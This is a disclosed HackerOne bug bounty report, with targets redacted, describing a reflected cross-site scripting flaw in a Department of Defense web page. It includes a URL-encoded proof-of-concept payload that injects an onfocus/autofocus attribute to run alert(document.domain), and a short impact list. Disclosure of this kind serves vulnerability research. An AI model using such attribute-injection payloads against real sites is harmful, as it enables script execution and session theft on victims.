# Reflected XSS at https://██████████/████████ via "███████" parameter

## Report Details
- **Report ID**: 1457493
- **URL**: https://hackerone.com/reports/1457493
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-21T15:40:29.143Z
- **Disclosed**: 2022-02-14T21:20:46.378Z

## Reporter
- **Username**: pelegn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
There is Reflected Cross site scripting issue at the following url:

https://████████/█████

Proof Of Concept

https://████/███?███=%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22&submit=Search

███

Best Regards
@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://███████/████████?███████=%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22&submit=Search

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
